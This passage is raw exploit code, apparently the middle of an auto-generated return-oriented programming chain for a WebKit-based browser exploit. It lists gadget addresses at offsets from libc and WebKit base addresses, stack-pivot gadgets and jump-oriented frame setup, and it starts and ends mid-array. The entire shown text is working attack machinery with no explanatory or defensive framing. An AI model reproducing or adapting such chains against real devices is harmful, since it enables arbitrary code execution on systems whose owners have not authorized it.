libc_base+793877, //pop rsi
ropchain+152096, //L2208
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+152064, //L2206
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+152080, //L2207
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2206:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2207:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2208:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+152168, //L2209
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2209:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+152224, //L2211
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2211:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+152304, //L2213
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2213:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2215:
db([4294967284, 4294967295]); // -0xc
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+152424, //L2218
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+152408, //L2216
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2216:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2218:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+152592, //L2221
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+152608, //L2222
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+152576, //L2219
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+152560, //L2220
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2220:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2219:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2221:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2222:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+152712, //L2223
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+152744, //L2225
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+152728, //L2224
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2223:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2224:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2225:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877, //pop rsi
ropchain+152832, //L2226
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2226:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+152888, //L2228
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2228:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+152960, //L2230
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2230:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2232:
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+2997875, //mov [rax], rcx
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2234:
db([40, 0]); // 0x28
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+153120, //L2237
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+153104, //L2235
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2235:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2237:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+153264, //L2240
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+153232, //L2238
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+153248, //L2239
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2238:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2239:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2240:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+153344, //L2241
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2241:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2243:
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+153464, //L2246
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+153448, //L2244
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2244:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2246:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+153608, //L2249
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+153576, //L2247
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+153592, //L2248
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2247:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2248:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2249:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+153680, //L2250
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2250:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+153736, //L2252
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2252:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+153816, //L2254
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2254:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2256:
db([4294967284, 4294967295]); // -0xc
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+153936, //L2259
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+153920, //L2257
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2257:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2259:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+154104, //L2262
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+154120, //L2263
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+154088, //L2260
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+154072, //L2261
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2261:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2260:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2262:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2263:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+154224, //L2264
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+154256, //L2266
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+154240, //L2265
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2264:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2265:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2266:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877, //pop rsi
ropchain+154344, //L2267
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2267:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+154400, //L2269
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2269:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+154496, //L2271
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2271:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+154552, //L2273
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2273:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L2275:
db([16, 0]); // 0x10
set_gadget(libc_base+788575,); //pop rax
//L2276:
db([16, 0]); // 0x10
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877, //pop rsi
ropchain+154704, //L2277
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2277:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+154760, //L2279
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2279:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+154864, //L2281
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2281:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2283:
db([32, 0]); // 0x20
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+154984, //L2286
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+154968, //L2284
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2284:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2286:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+155128, //L2289
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+155096, //L2287
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+155112, //L2288
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2287:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2288:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2289:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+155208, //L2290
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2290:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2292:
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+155328, //L2295
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+155312, //L2293
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2293:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2295:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+155472, //L2298
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+155440, //L2296
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+155456, //L2297
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2296:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2297:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2298:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L2300:
ropchain+155576, //L2299
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+86456, //_create_extcall
//L2299:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967264, 4294967295]); // -0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+155648, //L2301
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2301:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2303:
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+155768, //L2306
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+155752, //L2304
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2304:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2306:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+155912, //L2309
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+155880, //L2307
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+155896, //L2308
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2307:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2308:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2309:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L2310:
jop_frame_addr,
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+156040, //L2311
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2311:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2313:
db([24, 0]); // 0x18
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+156160, //L2316
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+156144, //L2314
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2314:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2316:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+156304, //L2319
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+156272, //L2317
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+156288, //L2318
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2317:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2318:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2319:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+156384, //L2320
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2320:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2322:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+156504, //L2325
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+156488, //L2323
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2323:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2325:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+156648, //L2328
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+156616, //L2326
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+156632, //L2327
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2326:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2327:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2328:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L2330:
ropchain+156752, //L2329
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+157584, //L2331
//L2329:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967264, 4294967295]); // -0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+156888, //L2333
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+156904, //L2334
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+156872, //L2332
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2332:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2333:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2334:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+157008, //L2335
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+157040, //L2337
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+157024, //L2336
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2335:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2336:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2337:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+157136, //L2338
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+157152, //L2339
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2338:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2339:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+157264, //L2340
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+157248, //L2341
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2341:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2340:
db([0, 0]); // 0x0
set_gadgets([
libc_base+793877, //pop rsi
ropchain+157352, //L2343
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+157336, //L2342
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2342:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2343:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+157448, //L2344
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+157464, //L2345
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2344:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2345:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+157576, //L2346
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+157560, //L2347
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2347:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2346:
db([0, 0]); // 0x0
//L2331:
set_gadget(libc_base+793877,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+105267, //pop rdx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+10235455, //pop r9
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+785193, //xor rax, rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+7438103, //mov [rsi], rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
